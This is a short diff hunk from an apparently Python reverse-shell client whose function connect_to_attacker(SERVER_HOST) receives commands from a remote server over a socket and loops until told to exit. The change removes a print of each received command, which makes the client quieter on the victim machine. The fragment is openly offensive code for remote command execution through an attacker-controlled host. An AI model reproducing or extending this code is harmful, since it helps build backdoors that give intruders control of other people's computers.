@@ -116,7 +116,6 @@ def connect_to_attacker(SERVER_HOST):
         # receive the command from the server
         command = s.recv(BUFFER_SIZE).decode()
         splited_command = command.split()
-        print(command)
         if command.lower() == "exit":
             # if the command is exit, just break out of the loop
             break
